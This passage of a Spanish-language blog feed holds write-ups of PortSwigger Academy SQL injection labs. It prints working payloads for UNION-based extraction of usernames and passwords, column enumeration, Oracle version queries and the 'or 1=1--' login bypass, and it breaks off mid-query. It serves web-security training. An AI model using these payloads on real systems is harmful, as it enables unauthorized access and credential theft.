&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username password from users--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username+password from users--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora con alguno de los payloads ingresados pudimos recuperar los datos en una misma columna como se puede ver y ya contamos con el usuario y las credenciales, ya solo queda ingresar al sistema y resuelto.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 190; 
			flex-basis: 457px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto.png&#34; data-size=&#34;1759x922&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto.png&#34;
			width=&#34;1759&#34;
			height=&#34;922&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto_hu9d5730c6ab29b54153ded2e5932f61ce_120693_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto_hu9d5730c6ab29b54153ded2e5932f61ce_120693_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Algo para finalizar que se podria hacer es agregar un guion para saber cuando termina una columna de la otra, esto se arregla agregando cualquier caracter en el medio, por ejemplo un &lt;code&gt;-&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username||&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;||password from users--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 7</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 7" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle&#34;&gt;Lab: SQL injection attack, querying the database type and version on Oracle&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la version de Oracle especificamente algo sobre este string &lt;code&gt;Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ya que sabemos que el gestor es Oracle, se utilizaran payloads de Oracle y la manera de extraer los datos es muy diferente, siguiendo los pasos anteriores tocara enumerar columnas&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- //Genera error
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude. En este caso &lt;code&gt;Oracle&lt;/code&gt; como se nota no se puede enviar un select sin el valor from, ya que es algo propio de Oracle que es una tabla especial.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from DUAL--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-version&#34;&gt;Recuperar version&lt;/h3&gt;
&lt;p&gt;Ahora recuperar la version, las consultas utilizadas para esto en &lt;code&gt;Oracle&lt;/code&gt; son las siguientes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;banner&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$version&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$instance&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;La inyeccion quedaria de la siguiente manera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union SELECT banner,null FROM v$version--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$instance&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 107; 
			flex-basis: 257px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto.png&#34; data-size=&#34;1737x1618&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto.png&#34;
			width=&#34;1737&#34;
			height=&#34;1618&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto_hu081edbd2834f27b821984a0363499c58_455462_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto_hu081edbd2834f27b821984a0363499c58_455462_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 2</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/headlab2.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 2" /&gt;&lt;h1 id=&#34;lab-sql-injection-vulnerability-allowing-login-bypass&#34;&gt;Lab: SQL injection vulnerability allowing login bypass&lt;/h1&gt;
&lt;p&gt;En este laboratorio se pretende explotar un SQL Injection, esta vez es un inicio de sesion, y se intentara explotar como en el laboratorio 1 en el cual se tiene que tratar de hacer un bypass para que el sistema no valide el resto que seria la contrasena. La consulta que hara seguramente sera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;contrasena&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Se tratara de hacer que el sistema ya no invalide la contrasena que es enviada en la peticion, todo esto comentando lo que le sigue, de esta manera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--&amp;#39; AND password = &amp;#39;contrasena&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;De esta manera solo valida al usuario y la contrasena se mantiene comentada.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso hay que hacerse con el usuario &lt;code&gt;administrator&lt;/code&gt; del sistema, asi que se procede a realizar la siguiente inyeccion:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;administrator&#39; or 1=1--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 209; 
			flex-basis: 503px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/payload.png&#34; data-size=&#34;1092x521&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/payload.png&#34;
			width=&#34;1092&#34;
			height=&#34;521&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/payload_hu62a97a011e43fb0ff37d118c4129fe27_24281_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/payload_hu62a97a011e43fb0ff37d118c4129fe27_24281_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Payload inyectado en usuario&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Payload inyectado en usuario&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;que quedaria asi al ejecutar la consulta:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--&amp;#39; AND password = &amp;#39;contrasena&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finalmente hemos resuelto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 277; 
			flex-basis: 664px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/resuelto.png&#34; data-size=&#34;1765x637&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/resuelto.png&#34;
			width=&#34;1765&#34;
			height=&#34;637&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/resuelto_hu1f762c5329538831645bcff2ad905856_58052_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/resuelto_hu1f762c5329538831645bcff2ad905856_58052_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Login Bypass&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Login Bypass&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Tambien hubiera sido posible utilizar una &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt; para realizar un ataque con intruder pero esta vez no fue necesario ya que el bypass es basico, pero se podria intentar.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass2.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Lista&lt;/a&gt; de payloads bypass login&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 1</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/</link>
        <pubDate>Mon, 01 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 1" /&gt;&lt;h1 id=&#34;lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data&#34;&gt;Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data&lt;/h1&gt;
&lt;p&gt;Este laboratorio contiene una vulnerabilidad de SQL Injection y la manera de resolverlo es que haga un ataque de SQL y que muestra los detalles de todos los productos en cualquier categoria, tanto &lt;code&gt;released&lt;/code&gt; como &lt;code&gt;unreleased&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Nos regalan una pista y se nos dice que el sistema realiza la siguiente consulta SQL&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;products&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;category&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;released&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Como lo explica en la lectura del laboratorio, la aplicacion recupera datos de la categoria &lt;code&gt;Gifts&lt;/code&gt; y que solo se muestre los datos que tengan &lt;code&gt;released&lt;/code&gt; como valor 1.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;He probado los siguientes payloads para saber si podria mostrar el resto de productos que no esta mostrando anteriormente.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Payload&lt;/th&gt;
&lt;th&gt;Accion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Gifts&#39;&amp;ndash;&lt;/td&gt;
&lt;td&gt;Muestra solo 1 producto mas&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Gifts&#39;&amp;ndash; -&lt;/td&gt;
&lt;td&gt;Muestra solo 1 producto master&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Gifts&#39; and released = 0&amp;ndash;&lt;/td&gt;
&lt;td&gt;Muestra solo 1 producto&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Al notar como hace la validacion nos podemos dar cuenta que podriamos bypassear esa instruccion, recordando a la forma en que se hace un bypass a un login. Creando la siguiente consulta a inyectar quedaria: SQL&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Gifts&#39; or 1=1--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Para que al final al inyectar la consulta SQL quedaria: SQL&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;products&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;category&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- AND released = 1
